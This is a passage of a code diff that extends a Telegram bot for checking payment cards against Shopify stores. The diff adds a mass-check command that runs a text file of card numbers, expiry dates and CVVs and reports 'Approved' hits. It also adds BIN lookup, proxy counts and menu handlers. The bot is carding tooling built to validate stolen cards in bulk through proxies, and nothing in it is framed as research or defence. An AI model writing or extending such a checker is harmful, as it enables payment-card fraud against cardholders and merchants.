+                        f"└ <b>Progress:</b> {progress}\n\n"
+                        "<i>Please wait, this may take some time...</i>",
+                        parse_mode=ParseMode.HTML
+                    )
+            
+            except Exception as e:
+                results.append(f"{card} -> ERROR: {str(e)}")
+                errors += 1
+                logger.error(f"Error processing card {card}: {e}")
+        
+        time_taken = round(time.time() - start_time, 2)
+        result_content = "\n".join(results)
+        result_filename = f"ShopifyResults_{approved}Hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        
+        with io.BytesIO(result_content.encode('utf-8')) as result_file:
+            result_file.name = result_filename
+            await update.message.reply_document(
+                document=result_file,
+                caption=generate_header("mass check results") + 
+                f"🔹 <b>Total Cards:</b> <code>{total_cards}</code>\n"
+                f"├ <b>✅ Approved:</b> <code>{approved}</code>\n"
+                f"├ <b>❌ Declined:</b> <code>{declined}</code>\n"
+                f"└ <b>⚠️ Errors:</b> <code>{errors}</code>\n\n"
+                f"<b>⏱ Time Taken:</b> <code>{time_taken}s</code>"
+                + generate_footer(update.effective_user),
+                parse_mode=ParseMode.HTML
+            )
+    
+    except Exception as e:
+        logger.error(f"Mass check error: {e}")
+        await update.message.reply_text(
+            generate_header("mass check") + 
+            f"⚠️ An error occurred during mass check:\n<code>{html.escape(str(e))}</code>",
+            parse_mode=ParseMode.HTML
+        )
 
+async def bin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args or len(context.args[0]) < 6:
+        await update.message.reply_text(
+            generate_header("bin lookup") + 
+            "⚠️ Please provide a valid BIN (first 6 digits of card).\n\n"
+            "Usage: <code>/bin 123456</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    bin_number = context.args[0][:6]
+    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
+    
+    bin_data = await get_bin_details(bin_number)
+    
+    bin_info = generate_header("bin information")
+    bin_info += f"""
+<b>🔹 BIN:</b> <code>{bin_data.get('bin', 'N/A')}</code>
+<b>🔹 Scheme:</b> <code>{bin_data.get('scheme', 'N/A')}</code>
+<b>🔹 Type:</b> <code>{bin_data.get('type', 'N/A')}</code>
+<b>🔹 Brand:</b> <code>{bin_data.get('brand', 'N/A')}</code>
 
-# --- 💬 6. CONVERSATION & CALLBACK HANDLERS 💬 ---
+<b>🏦 Bank:</b> <code>{bin_data.get('bank_name', 'N/A')}</code>
+<b>🌍 Country:</b> {bin_data.get('country_emoji', '🌐')} <code>{bin_data.get('country_name', 'N/A')}</code>
+"""
+    
+    if 'error' in bin_data:
+        bin_info += f"\n⚠️ <b>Note:</b> <code>{bin_data['error']}</code>\n"
+    
+    bin_info += generate_footer(update.effective_user)
+    
+    keyboard = [
+        [InlineKeyboardButton("🔁 Lookup Another", callback_data="nav:bin_lookup")],
+        [InlineKeyboardButton("🔙 Main Menu", callback_data="nav:show_start")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(bin_info, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
+
+async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    stats_msg = generate_header("bot statistics")
+    stats_msg += f"""
+<b>📊 Bot Stats:</b>
+├ <b>👥 Total Users:</b> <code>{len(current_user_shopify_site)}</code>
+├ <b>🌐 Active Proxies:</b> <code>{len(PROXY_LIST)}</code>
+└ <b>⏳ Uptime:</b> <code>100%</code>
+
+<b>🔧 System Info:</b>
+├ <b>Python:</b> <code>3.11</code>
+├ <b>Library:</b> <code>python-telegram-bot 20.3</code>
+└ <b>Last Update:</b> <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>
+"""
+    stats_msg += generate_footer(update.effective_user)
+    
+    keyboard = [
+        [InlineKeyboardButton("🔄 Refresh", callback_data="nav:refresh_stats")],
+        [InlineKeyboardButton("🔙 Main Menu", callback_data="nav:show_start")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(stats_msg, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
+
+# --- Callback Handlers ---
 async def button_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Routes all inline button clicks to the correct function."""
     query = update.callback_query
-    await query.answer() # Acknowledge the button press
+    await query.answer()
     
-    action = query.data
-
-    if action == "nav:show_start":
+    data = query.data
+    if data == "nav:show_start":
         await start_command(update, context)
-    elif action == "nav:show_cmds":
+    elif data == "nav:show_cmds":
         await cmds_command(update, context)
-    elif action == "site:show_current":
+    elif data == "nav:refresh":
+        await start_command(update, context)
+    elif data == "nav:refresh_stats":
+        await stats_command(update, context)
+    elif data == "site:prompt_add":
+        await query.message.reply_text(
+            generate_header("set site") + 
+            "🔹 Please send your Shopify site URL in the format:\n\n"
+            "<code>/add https://yourshopifystore.com</code>",
+            parse_mode=ParseMode.HTML
+        )
+    elif data == "site:show_current":
         await my_site_command(update, context)
-    elif action == "site:prompt_add":
-        await query.message.edit_text("🔗 **Enter Your Shopify Site URL**\nSend the full URL (e.g., `https://kith.com`) as a message. To cancel, type /cancel.", parse_mode=ParseMode.HTML)
-        return AWAIT_SITE
-    elif action == "nav:show_chk_help":
-        await query.message.edit_text("To perform a single check, use the command:\n<code>/chk CARD|MONTH|YEAR|CVV</code>", parse_mode=ParseMode.HTML)
-    elif action == "nav:show_mchk_help":
-        await query.message.edit_text("To perform a mass check, create a <code>.txt</code> file with one card per line, then reply to the file with the <code>/mchk</code> command.", parse_mode=ParseMode.HTML)
+    elif data == "nav:single_check":
+        await query.message.reply_text(
+            generate_header("single check") + 
+            "🔹 Please send the card details in format:\n\n"
+            "<code>/chk 4111111111111111|12|2025|123</code>",
+            parse_mode=ParseMode.HTML
+        )
+    elif data == "nav:mass_check":
+        await query.message.reply_text(
+            generate_header("mass check") + 
+            "🔹 Please reply to a .txt file containing cards with:\n\n"
+            "<code>/mchk</code>\n\n"
+            "<b>Format:</b> One card per line in <code>N|M|Y|C</code> format",
+            parse_mode=ParseMode.HTML
+        )
+    elif data == "nav:bin_lookup":
+        await query.message.reply_text(
+            generate_header("bin lookup") + 
+            "🔹 Please send the BIN (first 6 digits) to lookup:\n\n"
+            "<code>/bin 123456</code>",
+            parse_mode=ParseMode.HTML
+        )
 
-
-async def receive_site_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Receives and saves the site URL from the user after being prompted."""
-    user_id = update.effective_user.id
-    site_url = update.message.text.strip()
-    set_site_for_user(user_id, site_url)
-    
-    await update.message.reply_text(f"✅ **Site Updated!**\nYour target site is now set to:\n<code>{html.escape(site_url)}</code>", parse_mode=ParseMode.HTML)
-    # Go back to the main menu
-    await start_command(update, context)
-    return ConversationHandler.END
-
-async def cancel_conversation(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Cancels the current conversation (e.g., adding a site)."""
-    await update.message.reply_text("Action cancelled. Returning to main menu.")
-    await start_command(update, context)
-    return ConversationHandler.END
-
+# --- Error Handling ---
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
-    """Logs errors and sends a user-friendly message."""
     logger.error("Exception while handling an update:", exc_info=context.error)
     
-    # Extract traceback
     tb_list = traceback.format_exception(None, context.error, context.error.__traceback__)
     tb_string = "".join(tb_list)
     
-    # You can send error details to yourself for debugging
-    # For example, replace 'YOUR_USER_ID' with your actual Telegram user ID
-    # await context.bot.send_message(chat_id='YOUR_USER_ID', text=f"An error occurred: {tb_string}")
+    error_msg = (
+        f"An exception was raised while handling an update\n"
+        f"<pre>{html.escape(tb_string)}</pre>"
+    )
     
     if update and isinstance(update, Update):
-        await update.effective_message.reply_text("🤖 Oops! An internal error occurred. The developer has been notified.")
+        await update.effective_message.reply_text(
+            generate_header("error") + 
+            "⚠️ An unexpected error occurred. The developer has been notified.\n\n"
+            "Please try again later.",
+            parse_mode=ParseMode.HTML
+        )
 
-
-# --- 🚀 7. BOT LAUNCHER 🚀 ---
+# --- Main Application ---
 def main():
-    """Starts the bot."""
-    if not TELEGRAM_BOT_TOKEN or "YOUR_TOKEN" in TELEGRAM_BOT_TOKEN:
-        logger.critical("CRITICAL: Telegram Bot Token is missing or is a placeholder.")
+    if not TELEGRAM_BOT_TOKEN:
+        logger.critical("Telegram Bot Token is missing!")
         return
-
-    logger.info("System initializing...")
+    
+    logger.info("Starting bot...")
     load_user_sites()
     
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
-
-    # Conversation handler for adding a site interactively
-    conv_handler = ConversationHandler(
-        entry_points=[CallbackQueryHandler(button_callback_handler, pattern='^site:prompt_add$')],
-        states={
-            AWAIT_SITE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_site_url)]
-        },
-        fallbacks=[CommandHandler('cancel', cancel_conversation)]
-    )
-
-    application.add_handler(conv_handler)
     
-    # Command handlers
+    # Command Handlers
     application.add_handler(CommandHandler("start", start_command))
     application.add_handler(CommandHandler("cmds", cmds_command))
     application.add_handler(CommandHandler("add", add_command))
     application.add_handler(CommandHandler("my_site", my_site_command))
     application.add_handler(CommandHandler("chk", chk_command))
+    application.add_handler(CommandHandler("mchk", mchk_command))
+    application.add_handler(CommandHandler("bin", bin_command))
+    application.add_handler(CommandHandler("stats", stats_command))
     
-    # Message handler for /mchk must check for replies
-    application.add_handler(MessageHandler(filters.COMMAND & filters.REPLY, mchk_command))
-    
-    # Fallback callback handler for all other buttons
+    # Callback Handlers
     application.add_handler(CallbackQueryHandler(button_callback_handler))
     
-    # Universal error handler
+    # Error Handler
     application.add_error_handler(error_handler)
     
-    logger.info("Bot is online and polling for updates.")
-    application.run_polling()
-
+    logger.info("Bot is now running...")
+    application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
     main()
